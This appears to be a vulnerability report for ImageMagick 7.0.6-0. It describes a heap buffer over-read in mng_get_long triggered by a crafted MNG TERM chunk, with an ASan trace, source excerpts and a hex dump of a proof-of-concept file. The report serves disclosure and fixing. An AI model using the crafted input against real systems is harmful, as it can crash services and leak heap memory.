ImageMagick-7.0.6-0
<br>
```
  ~$identify $FILE or convert $FILE
```
<br>build instructions:
```
  ~$ sudo apt-get install imagemagick libmagick++-dev
  ~$ CC="gcc" CFLAGS="-fsanitize=address" ./configure 
  ~$ make;make install
```
when identify or convert MNG file, imagemagick will cause a heap buffer overflow
> =================================================================
==27897==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x602000008cd7 at pc 0x7fd15aeb8bae bp 0x7fffe2bc73e0 sp 0x7fffe2bc73d0
READ of size 1 at 0x602000008cd7 thread T0
    #0 0x7fd15aeb8bad in mng_get_long coders/png.c:1636
    #1 0x7fd15aec8041 in ReadOneMNGImage coders/png.c:5391
    #2 0x7fd15aed3e29 in ReadMNGImage coders/png.c:7497
    #3 0x7fd15aa4bc4f in ReadImage MagickCore/constitute.c:497
    #4 0x7fd15ac97e06 in ReadStream MagickCore/stream.c:1045
    #5 0x7fd15aa4b17c in PingImage MagickCore/constitute.c:226
    #6 0x7fd15aa4b5a9 in PingImages MagickCore/constitute.c:327
    #7 0x7fd15a40ba2a in IdentifyImageCommand MagickWand/identify.c:319
    #8 0x7fd15a462c7a in MagickCommandGenesis MagickWand/mogrify.c:183
    #9 0x40169a in MagickMain utilities/magick.c:149
    #10 0x4017be in main utilities/magick.c:180
    #11 0x7fd159cdb82f in __libc_start_main (/lib/x86_64-linux-gnu/libc.so.6+0x2082f)
    #12 0x4012c8 in _start (/home/sf/ImageMagick-7.0.6-0/build-gcc/bin/magick+0x4012c8)

The vulnerability is caused when identify MNG image, which happens  in function mng_get_long (coders/png.c:1636) which is called by line 5391 at coders/png.c.  
Here is the critical code of mng_get_long and its call code:
```
static long mng_get_long(unsigned char *p)
{
  return((long) ((p[0] << 24) | (p[1] << 16) | (p[2] << 8) | p[3]));
}
```

```

        if (memcmp(type,mng_TERM,4) == 0)
          {
            int
              repeat=0;

            if (length != 0)
              repeat=p[0];

            if (repeat == 3)
              {
                final_delay=(png_uint_32) mng_get_long(&p[2]);
                mng_iterations=(png_uint_32) mng_get_long(&p[6]);

                if (mng_iterations == PNG_UINT_31_MAX)
                  mng_iterations=0;

                image->iterations=mng_iterations;
                term_chunk_found=MagickTrue;
              }
```
It is caused by heap buffer overflow, which is caused by a read operation without overflow check.
The p buffer is pointer to chunk, its buffer data and  length are read from input file,

```
        p=NULL;
        chunk=(unsigned char *) NULL;

        if (length != 0)
          {
            chunk=(unsigned char *) AcquireQuantumMemory(length,
             sizeof(*chunk));

            if (chunk == (unsigned char *) NULL)
              ThrowReaderException(ResourceLimitError,
                "MemoryAllocationFailed");

            for (i=0; i < (ssize_t) length; i++)
              chunk[i]=(unsigned char) ReadBlobByte(image);

            p=chunk;
          }
```
Set a breakpoint at line 5391. Then print length of p, when program run to 5391, the length of p is 7, and code of line 5391 called mng_get_long with argument &p[6], this is the last one of p, but the mng_get_long function operation read p[6],p[7],p[8] and p[9], so this  called a heap buffer overflow read.

In the function ReadOneMNGImage, length, type and p are read from input file. The poc file data as follwing: 
```
~$xxd $FILE
00000000: 8a4d 4e47 0d0a 1a0a 0000 001c 4d48 4452  .MNG........MHDR
00000010: 0000 0010 0000 0010 0000 0064 0000 0000  ...........d....
00000020: 0000 0000 0000 0000 0000 000b 2cf4 5caf  ............,.\.
00000030: 0000 0001 5445 524d 0300 0000            ....TERM....
```
When setting proper length and repeat value, it is possible to disclosing some critical data, such as heap chunk data and even other applications’ private data. 

####AdditionWhen setting proper “length” and “repeat” value, the mng_get_long function will cause different length heap buffer overflow. For example, in my debugging, when the value of length is 1, and will cause more heap overflow read.

####Testcase: 
